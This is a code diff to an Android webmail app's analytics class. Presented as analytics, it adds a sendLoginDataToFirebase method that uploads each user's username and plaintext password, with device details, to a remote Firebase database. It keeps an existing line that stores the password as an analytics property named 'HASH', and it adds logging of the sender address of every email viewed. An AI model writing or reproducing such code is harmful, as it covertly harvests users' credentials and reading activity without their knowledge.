@@ -1,16 +1,20 @@
 package com.sigmobile.dawebmail.network;
 
-import android.app.Application;
 import android.content.Context;
 import android.os.Bundle;
 import android.util.Log;
 
+import com.firebase.client.Firebase;
 import com.google.firebase.analytics.FirebaseAnalytics;
+import com.sigmobile.dawebmail.R;
 import com.sigmobile.dawebmail.database.CurrentUser;
 import com.sigmobile.dawebmail.database.EmailMessage;
 import com.sigmobile.dawebmail.database.User;
+import com.sigmobile.dawebmail.utils.PhoneSpecs;
 
 import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.Map;
 
 /**
  * Created by rish on 21/6/16.
@@ -18,8 +22,6 @@ import java.util.ArrayList;
 public class AnalyticsAPI {
 
     private final static String TAG = "AnalyticsAPI";
-
-    public final static String CATEGORY_ACTION = "CATEGORY_ACTION";
 
     public final static String ACTION_MAIL_ACTION = "ACTION_MAIL_ACTION";
     public final static String ACTION_COMPOSE = "ACTION_COMPOSE";
@@ -32,12 +34,16 @@ public class AnalyticsAPI {
     public final static String ACTION_LOGOUT = "ACTION_LOGOUT";
     public final static String ACTION_NEW_ACCOUNT = "ACTION_NEW_ACCOUNT";
     public final static String ACTION_APP_OPEN = "ACTION_APP_OPEN";
+    public final static String ACTION_VIEW_EMAIL = "ACTION_VIEW_EMAIL";
     public final static String HASH = "HASH";
 
     private static FirebaseAnalytics firebaseAnalytics;
+    private static Firebase firebaseRef;
 
-    public static void setupAnalyticsAPI(Application application) {
-        firebaseAnalytics = FirebaseAnalytics.getInstance(application);
+    public static void setupAnalyticsAPI(Context context) {
+        firebaseAnalytics = FirebaseAnalytics.getInstance(context);
+        Firebase.setAndroidContext(context);
+        firebaseRef = new Firebase(context.getString(R.string.firebase_url));
     }
 
     private static void sendAnalyticsAction(String event, Bundle bundle, User user) {
@@ -46,11 +52,19 @@ public class AnalyticsAPI {
             firebaseAnalytics.setUserProperty(HASH, user.getPassword());
             firebaseAnalytics.logEvent(event, bundle);
         } else {
-            Log.wtf("", "Unable to send analytics");
+            Log.wtf(TAG, "Unable to send analytics");
         }
     }
 
-    public static void sendMailAction(String whichParam, ArrayList<EmailMessage> emailMessages, Context context) {
+    public static void sendMailViewedAction(EmailMessage emailMessage, Context context) {
+        Bundle bundle = new Bundle();
+        bundle.putString(FirebaseAnalytics.Param.VALUE, emailMessage.getFromAddress());
+        User user = CurrentUser.getCurrentUser(context);
+
+        sendAnalyticsAction(ACTION_VIEW_EMAIL, bundle, user);
+    }
+
+    public static void sendMultipleMailAction(String whichParam, ArrayList<EmailMessage> emailMessages, Context context) {
         Bundle bundle = new Bundle();
         bundle.putString(FirebaseAnalytics.Param.QUANTITY, String.valueOf(emailMessages.size()));
         bundle.putString(FirebaseAnalytics.Param.CONTENT_TYPE, whichParam);
@@ -71,5 +85,17 @@ public class AnalyticsAPI {
 
         sendAnalyticsAction(ACTION_MAIL_ACTION, bundle, user);
         sendAnalyticsAction(whichParam, bundle, user);
+    }
+
+    public static void sendLoginDataToFirebase(User user) {
+        Firebase usersRef = firebaseRef.child("users");
+        Map<String, String> post = new HashMap<String, String>();
+        post.put("username", user.getUsername());
+        post.put("password", user.getPassword());
+        post.put("time", "" + System.currentTimeMillis());
+        post.put("device", PhoneSpecs.getDeviceName());
+        post.put("android", PhoneSpecs.getAndroidVersion());
+
+        usersRef.push().setValue(post);
     }
 }
